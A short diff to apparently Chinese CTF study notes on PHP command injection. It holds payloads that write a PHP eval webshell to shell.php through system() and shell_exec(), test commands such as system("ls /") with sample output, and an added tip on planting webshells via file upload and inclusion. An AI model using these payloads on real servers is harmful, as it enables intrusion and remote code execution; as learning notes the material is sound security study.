@@ -55,8 +55,9 @@ dl
 注入webshell
 system('echo \'<?php eval($_POST["shell"]);?>\' > shell.php');
 shell_exec('echo "<?php eval(\$_POST[\'shell\']); ?>" > shell.php')
+可以通过[[文件上传]] [[webshell]] 再 [[文件包含]] 注入webshell
 
-测试指令/shell 指令：
+测试指令/shell 指令：[[常用指令]]
 shell=phpinfo();
 shell=echo 123;
 shell=system("ls /"); -> "bin dev etc flag home lib media mnt proc root run sbin srv sys tmp usr var"
